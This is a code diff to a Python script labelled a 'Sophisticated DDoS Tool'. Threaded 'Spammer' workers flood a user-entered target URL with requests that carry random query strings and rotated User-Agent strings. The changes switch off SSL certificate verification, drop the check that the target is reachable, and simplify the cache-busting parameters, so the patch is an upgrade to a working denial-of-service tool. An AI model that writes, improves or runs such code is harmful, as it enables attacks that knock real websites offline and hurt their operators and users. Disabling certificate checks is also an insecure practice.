@@ -12,6 +12,7 @@ import time
 import random
 import string
 import sys
+import ssl
 import threading
 import urllib.request
 import socket
@@ -8228,15 +8229,13 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	]		
 			
 
+# Create an unverified SSL context to bypass SSL certificate verification
+ssl_context = ssl._create_unverified_context()
+
 class Spammer(threading.Thread):
     def __init__(self, url, number):
         threading.Thread.__init__(self)
-        self.url = (
-            url + "?" +
-            "&".join(
-                [f"{random.randint(0, 99999999)}={random.randint(0, 99999999)}" for _ in range(10)]
-            )
-        )
+        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
         self.num = number
         self.headers = {
             'User-Agent': random.choice(ua),
@@ -8246,14 +8245,13 @@ class Spammer(threading.Thread):
         self.Lock = threading.Lock()
 
     def request(self):
-        global N
         data = None
         # Use the local proxy `127.0.0.1:8080`
         proxy = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
         opener = urllib.request.build_opener(proxy)
         urllib.request.install_opener(opener)
         req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
+        urllib.request.urlopen(req, context=ssl_context)  # Pass the unverified SSL context
 
         print(Fore.RED + "0000000000000000000000000000")
         print(Fore.YELLOW + "DDoS Attack in Progress")
@@ -8308,19 +8306,14 @@ class MainLoop():
 
     def setup(self):
         global N, Close, Request, Tot_req
-        while True:
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Fore.YELLOW + "Sophisticated DDoS Tool")
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Style.RESET_ALL)
-            url = input('> Enter the target URL to DoS: ')
-            url = self.check_url(url)
-            try:
-                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-                response = urllib.request.urlopen(req)
-                break
-            except:
-                print('> Could not open the specified URL.')
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Fore.YELLOW + "Sophisticated DDoS Tool")
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Style.RESET_ALL)
+
+        # Accept URL without checking if it's online
+        url = input('> Enter the target URL to DoS: ')
+        url = self.check_url(url)
 
         while True:
             try:
